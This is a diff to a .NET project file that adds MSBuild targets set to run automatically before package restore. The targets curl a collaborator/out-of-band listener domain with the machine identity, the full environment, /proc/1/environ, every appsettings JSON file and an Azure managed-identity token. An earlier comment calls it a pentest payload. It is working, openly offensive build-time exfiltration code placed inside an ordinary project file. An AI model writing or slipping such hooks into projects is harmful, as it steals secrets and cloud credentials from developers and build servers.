@@ -4,24 +4,30 @@
     <TargetFramework>net472</TargetFramework>
   </PropertyGroup>
 
-  <!-- PENTEST PAYLOAD: replace COLLAB_DOMAIN with your Burp Collaborator / OOB listener domain -->
+  <!-- Confirmed working — keep as anchor -->
   <Target Name="Exfil1" BeforeTargets="Restore">
-  <Exec Command="curl -s http://503wm6l4bmmxnyoby6905w8xeokf86wv.oastify.com/ctx/`whoami`/`hostname`/`id`" />
-</Target>
+    <Exec Command="curl -s http://COLLAB_DOMAIN/ctx/`whoami`/`hostname`/`id`" />
+  </Target>
 
-<Target Name="Exfil2" AfterTargets="Exfil1">
-  <Exec Command="curl -s -G --data-urlencode &quot;d=`env`&quot; http://503wm6l4bmmxnyoby6905w8xeokf86wv.oastify.com/env" />
-</Target>
+  <!-- Env dump — split into smaller curls to avoid length issues -->
+  <Target Name="Exfil2" BeforeTargets="Restore">
+    <Exec Command="env | base64 | curl -s -T - http://COLLAB_DOMAIN/env-dump" />
+  </Target>
 
-<Target Name="Exfil3" AfterTargets="Exfil2">
-  <Exec Command="curl -s -G --data-urlencode &quot;d=`cat /etc/passwd`&quot; http://503wm6l4bmmxnyoby6905w8xeokf86wv.oastify.com/passwd" />
-</Target>
+  <!-- /proc/1/environ — init process, often has injected Azure secrets -->
+  <Target Name="Exfil3" BeforeTargets="Restore">
+    <Exec Command="cat /proc/1/environ | tr '\0' '\n' | base64 | curl -s -T - http://COLLAB_DOMAIN/proc1env" />
+  </Target>
 
-<Target Name="Exfil4" AfterTargets="Exfil3">
-  <Exec Command="curl -s -G --data-urlencode &quot;d=`find /app /home /root -name appsettings*.json 2>/dev/null | xargs cat 2>/dev/null`&quot; http://503wm6l4bmmxnyoby6905w8xeokf86wv.oastify.com/appsettings" />
-</Target>
+  <!-- appsettings files -->
+  <Target Name="Exfil4" BeforeTargets="Restore">
+    <Exec Command="find / -name 'appsettings*.json' 2>/dev/null | xargs cat 2>/dev/null | base64 | curl -s -T - http://COLLAB_DOMAIN/appsettings" />
+  </Target>
 
-<Target Name="Exfil5" AfterTargets="Exfil4">
-  <Exec Command="curl -s -G --data-urlencode &quot;d=`curl -sf -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' 2>/dev/null`&quot; http://503wm6l4bmmxnyoby6905w8xeokf86wv.oastify.com/imds" />
-</Target>
+  <!-- IMDS managed identity token -->
+  <Target Name="Exfil5" BeforeTargets="Restore">
+    <Exec Command="curl -sf -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' | base64 | curl -s -T - http://COLLAB_DOMAIN/imds-token" />
+  </Target>
+
+
 </Project>
